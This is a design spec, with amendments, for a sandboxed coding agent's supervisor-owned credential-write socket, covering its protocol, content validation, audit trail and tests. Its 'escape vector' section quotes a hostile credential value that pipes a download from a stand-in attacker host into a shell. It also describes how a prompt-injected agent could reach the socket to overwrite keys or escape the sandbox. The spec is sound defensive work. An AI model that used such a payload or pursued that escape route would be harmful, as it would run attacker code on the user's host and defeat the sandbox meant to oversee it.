# Spec: Supervisor-mediated credential writes

## Metadata

| Field | Value |
| --- | --- |
| Author | `fchery87` |
| Status | `Complete` |
| Created | `2026-08-22` |
| Last updated | `2026-08-23` |
| Roadmap phase | `none — follow-up to Phase 2b (OS sandbox)` |
| Tracking issue/PR | `https://github.com/Fchery87/apex-code/pull/33` |
| Compatibility posture | Preserves compatibility. No credential written today stops working, no settings key changes, and every existing read path is untouched. The change is purely additive: a write that fails today begins to succeed. The one deliberate incompatibility is that a credential written *through the new channel* may not contain a config-value reference (see "The escape vector"), which no existing caller does, because no existing caller can write at all from a session. |

## Executive summary

Apex Code keeps canonical credentials host-owned while every interactive session runs
inside the OS sandbox. The child reads a read-only `auth.json` projection and performs
credential mutations through a narrow supervisor-owned Unix socket. The supervisor holds
the host file lock while the child executes the `CredentialStore.modify` callback, rejects
non-literal values and malformed protocol input, and records accepted writes and refusals.
This lets `/login` work on both fresh and existing installations without making the host
credential file writable inside the sandbox. The shipped surface is `/login`; the proposed
`/settings` web-search key row was removed before implementation.

## Context and motivation

Phase 2b made the sandbox fail-closed and mounted the host credential file read-only. That
was correct: the agent should not be able to exfiltrate or tamper with credentials, and
`test/sandbox/credential-handoff.test.ts` pins the read-only behaviour deliberately.

What was never built is the other half. Credentials still need to be *written* sometimes,
and the only surfaces that write them live inside the child:

- `/login`, documented in `docs/providers.md` as the way to store a provider API key.
- `/settings` → Web search API key, added in PR #33.

Both call `AuthStorage.modify`, which opens the host file for writing and is refused.

The gap is not theoretical. It was found by a user typing a key into the settings row and
getting `EACCES: permission denied, open '/home/<user>/.apex-code/agent/auth.json'`, then
verifying from their own shell that the file is `0600`, owned by them, and writable.

## Current state

- `requiresSandboxedChild` (`core/sandbox/cli-launch.ts:17`) exempts only `auth`, `config`,
  `install`, `remove`, `uninstall`, `update`, `list`, the metadata flags, and `--help`.
  Every session that can construct an agent is sandboxed. There is no opt-out flag.
- The supervisor passes the host credential path as `readOnlyFiles` and advertises it to
  the child as `APEX_CODE_AUTH_PATH` (`cli-launch.ts:295`, `:309`).
- `linux-backend.ts:178` opens each read-only file with `openSync(path, "r")` and binds it
  into the child through `bwrap`. The child holds a read-only descriptor by construction.
- `getAuthPath()` (`config.ts:539`) returns `APEX_CODE_AUTH_PATH` when set, so every
  `AuthStorage` inside the child resolves to the read-only host file.
- `apex-code auth` cannot write either. It supports `check`, `print-api-key`, and
  `print-bearer-token` only (`cli/auth-command.ts`).
- `ReadOnlyAuthStorage` exists (`core/auth-storage.ts:204`) and throws a clear message, but
  is wired only to the `--no-refresh` CLI path (`main.ts:190`), not to the sandbox.
- A precedent for supervisor-mediated services already exists. The network proxy runs in
  the supervisor, listens on a unix socket, is bind-mounted into the child, is advertised
  as `APEX_UDS_PATH`, and enforces the host allowlist per request while recording refusals
  into `SandboxViolationStore`.

## The problem

Two problems, and the second is the one that makes this a spec rather than a patch.

**1. There is no write path.** A user cannot save a credential from the product's own UI.
The failure is reported as a filesystem permission error, which sends them to inspect a
file that is not the obstacle.

**2. The child cannot be trusted to ask.** The child process hosts both the TUI, which is
user-driven, and the agent loop, whose `bash` tool executes model-chosen commands *inside
that same process's sandbox*. Any socket the child can reach, a model-driven `bash`
command can also reach. The supervisor owns no terminal — the child does — so the
supervisor cannot prompt the user to confirm, and it cannot distinguish "the human typed
a key into `/settings`" from "the model wrote to the socket."

This is not a reason to abandon the channel. It is a constraint on what the channel may
be allowed to do.

### The escape vector

The severe risk is not a stolen or forged key. It is arbitrary host code execution.

`resolveConfigValue` (`core/resolve-config-value.ts`) treats a stored value beginning with
`!` as a shell command and executes it. Credentials are resolved on both sides of the
boundary: `AuthStorage.read` resolves them inside the child, and the supervisor resolves
config-value references on the host during launch — `resolveSupervisorAllowedHosts` reads
settings before the child exists.

So a child that can write `{"type":"api_key","key":"!curl attacker.example|sh"}` into the
host credential file has arranged for the host to execute an attacker-chosen command the
next time anything resolves that credential. That is a sandbox escape, reachable from a
prompt injection, and it is introduced entirely by adding the write channel.

Note what is *not* newly at risk. The credential file is already readable inside the
child, so confidentiality is conceded today and this change does not worsen it. What the
channel adds is integrity, and with it the reference-execution vector above.

## Goals

- `/login` succeeds inside a normal sandboxed session, including on a fresh install.
- A credential written through the channel cannot cause host command execution.
- Every write is auditable, and refusals are visible in the same place sandbox violations
  already surface.
- No change to how credentials are read, on either side of the boundary.
- The channel is one mechanism serving every credential surface, not one per caller.

## Non-goals

- **Not a general filesystem write channel.** This is credentials only. A generic
  "supervisor writes for the child" primitive is a much larger security surface and no
  caller needs it.
- **Not confirmation-in-the-supervisor.** The supervisor has no terminal. Any design that
  requires it to prompt is out of scope until the terminal ownership question is solved
  separately.
- **Not credential *deletion* policy changes.** Delete goes through the same channel and
  the same constraints; nothing about which credentials may exist changes.
- **Not removing the read-only mount.** The mount stays. The channel is the exception, and
  it is narrow.

## Proposed solution

A supervisor-side credential writer, reached over the existing unix socket pattern.

**Transport.** Reuse the network proxy's shape rather than inventing one: a unix socket
created by the supervisor, bind-mounted into the child, advertised through an environment
variable. A distinct socket from the network proxy, because the two carry unrelated
protocols and merging them would put credential writes behind a CONNECT parser.

**Protocol.** One request type: write or delete one credential, addressed by id. A literal
key string, or a delete. The response is success or a named refusal.

**The content constraint that makes this safe.** The supervisor rejects any value that
`isCommandConfigValue` recognises, and any value containing a `$` reference. Only a
literal secret may be written through the channel. This is what removes the escape vector:
the child can write a key, but not a program.

A user who genuinely wants `!op read op://...` in their credential file still has the path
they have today — edit the file, or set the environment variable — and that path runs
outside the sandbox where the user, not the agent, is the author.

**Audit.** Every accepted write and every refusal is recorded through the existing
`SandboxViolationStore` path, so a credential written by a prompt-injected agent is at
least visible after the fact rather than silent.

**What this deliberately does not solve.** The supervisor still cannot tell the human from
the model. The mitigation is that the *worst case has been reduced to something survivable*
— an agent can overwrite a provider key, which breaks that provider or bills someone
else's account, and can be seen in the audit tail. It cannot execute code on the host.
Whether that residual risk is acceptable is the decision this spec asks for, and it should
be made explicitly rather than inherited from an implementation.

**Rejected alternative: a writable copy in the child.** Mount a writable credential file
inside the child and reconcile it to the host on exit. Rejected because reconciliation is
a second trust boundary with the same problem and worse failure modes, and because a
crashed session silently loses the credential the user just typed.

**Rejected alternative: keep failing, improve the message.** This is what PR #33 currently
does, and it is the right interim state. It is rejected as the end state because the
product documents `/login` as the way to store a key and that instruction is false in
every normal session.

## Deletion inventory

- The original one-shot child-read/host-replace protocol is obsolete. The repaired channel
  replaces it with a serialized `modify` handshake under the host credential lock.
- The original conditional channel setup is obsolete. The host now creates a missing
  canonical `auth.json` before an enforcing launch instead of letting first-run writes
  fall back to workspace sandbox state.
- `ReadOnlyAuthStorage` remains. Its default `--no-refresh` mode still does not execute
  command-backed keys; sandbox projected reads opt into the ordinary resolved-read behavior.
- The removed `/settings` web-search credential row remains outside the completed scope.

## Risks

- **The residual integrity risk is real and unmitigated by design.** A prompt-injected
  agent can overwrite a provider credential. Accepted only because the alternative is a
  product whose documented credential flow does not work, and because the audit tail makes
  it detectable.
- **A second socket into the child is a second attack surface.** Mitigated by a
  single-purpose protocol with no parser complexity, and by the content constraint.
- **Reference rejection will surprise someone.** A user who expects to type
  `!op read ...` into `/settings` will be refused. The refusal must say why and name the
  path that still works.
- **macOS backend parity.** `macos-backend.ts` must implement the same socket projection or
  the feature silently exists on one platform only. Verification must cover both.

## Verification

- A real sandboxed CLI turn that writes a credential and observes it on the host,
  extending `test/sandbox/credential-handoff.test.ts` rather than duplicating its setup.
- A negative test per rejected content class: `!command`, `$VAR`, `${VAR}`.
- A test that the read-only mount is still in force, so the channel is proven to be the
  only write path rather than an accidental loosening of the mount.
- A test that a refusal is recorded in the violation tail.
- Both platform backends, because a socket that exists only on Linux is a silent gap.

## Rollout

Single change, no flag. The channel is either present and constrained or absent; a
half-enabled credential writer is worse than either. `/login` is the shipping credential
surface. The one-line `/settings` credential row discussed during design was removed before
this work landed and is not part of the completed scope.

## Closure amendment (2026-08-22)

Landed as `4016794c3` (channel + wiring + tests) with docs in the same commit: ADR 0015's
dated amendment, this spec's status, and the changelog entry. Verification, as actually
run:

- Protocol unit tests over a real unix socket in a scratch directory: literal write,
  `!command` refusal, `$VAR` and `${VAR}` refusals (including nested OAuth fields),
  delete, invalid frames, accepted-write audit entries.
- Launch-contract tests on both backends: Linux bind under `/home` proven by a real
  `bwrap` child finding the socket at `APEX_CREDENTIAL_PROXY_PATH`; macOS Seatbelt
  `(allow network-outbound (remote unix-socket (literal ...)))` proven at the profile
  level with the canonicalized path.
- A live sandboxed CLI turn (`credential-handoff.test.ts`), now gated on any enforcing
  platform rather than Linux only: direct filesystem write still refused by the mount; a
  literal written through the channel reaches the host `auth.json`; a `!command` value is
  refused and never lands; both the accepted write and the refusal appear in the violation
  tail the supervisor prints.
- Runtime wiring proven without a sandbox: a session built while the channel is
  advertised routes `/login` through it (audit entry present), and builds the ordinary
  host store otherwise.

**Historical verification status for the 2026-08-22 landing:** a live macOS
`sandbox-exec` run was pending until the commits reached macOS CI. The one-line `/settings`
credential row was removed before implementation and is not restored; `/login` is the
shipping surface.


## Repair amendment (2026-08-23)

A post-merge review found that the first protocol did not fully satisfy this spec or the
`CredentialStore` contract. The implementation was repaired on current `main` with these
constraints:

- A missing canonical `auth.json` is created by the host as `0600` before launch. Fresh
  sessions now receive the same read-only projection and write channel as existing users;
  credentials never fall back to workspace sandbox state.
- `modify` is a serialized handshake. The supervisor holds the host file lock, sends the
  current raw credential to the child callback, validates the proposed result, commits it,
  and returns the post-write value. Concurrent refreshes therefore cannot both derive from
  the same rotated OAuth token.
- Existing host-authored command and environment references still resolve on sandbox reads.
  The `--no-refresh` read-only store retains its separate rule that command credentials are
  not executed.
- The supervisor validates JSON roots and credential shapes at the socket boundary. Frames
  are byte-bounded before decoding, connections are bounded and timed out, active sockets
  are destroyed during cleanup, and rejected secret material is never copied into audit
  messages.
- Each endpoint lives in a supervisor-created `0700` directory with a `0600` socket. All
  startup paths after channel creation share one cleanup boundary, and a later supervisor
  reclaims same-user endpoint directories whose encoded owner PID is no longer alive.

Verification run for the uncommitted repair on 2026-08-23:

- `npm run check` passed, including Biome, documentation lifecycle, dependency/import
  checks, TypeScript, generated lock checks, and browser smoke.
- The expanded auth/sandbox slice passed: 12 files, 132 tests passed, 6 platform-specific
  tests skipped.
- The live sandbox handoff passed both an absent-file first mutation and the existing-file
  read-only/refusal/write flow on the enforcing Linux backend.
- The first unrestricted full `npm test` run completed 2701 tests with four
  load-sensitive failures outside credential assertions. All four passed when rerun
  individually. The complete coding-agent suite then passed with bounded concurrency:
  314 files, 2709 tests passed, 57 skipped. Live macOS enforcement remains a CI-only
  verification item.

No repair commit SHA is recorded yet because the repair is intentionally uncommitted during
validation. This section must be updated with the real commit before the change is marked
landed.

The protocol's unavoidable commit-point rule is explicit: if the host commits a credential
and the final reply is lost, the child reports an uncertain failure and does not retry the
mutation automatically. Retrying a rotated OAuth credential could corrupt the newer value.
